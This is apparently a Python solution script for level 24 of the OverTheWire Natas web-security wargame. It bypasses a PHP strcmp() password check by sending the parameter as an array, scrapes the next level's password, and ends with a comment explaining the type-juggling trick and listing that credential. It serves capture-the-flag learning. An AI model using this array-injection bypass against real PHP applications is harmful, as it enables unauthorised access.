from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)


lvl = '24'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)




my_params = {"passwd[]":'not sure'}

res, soup = make()
pw = (re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:])
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)



'''
Another type conversion lesson. 0, 0.0, "0", and NULL auto cast to false.
And passing an array into strcmp() returns NULL in PHP.

Username: natas25
Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
'''
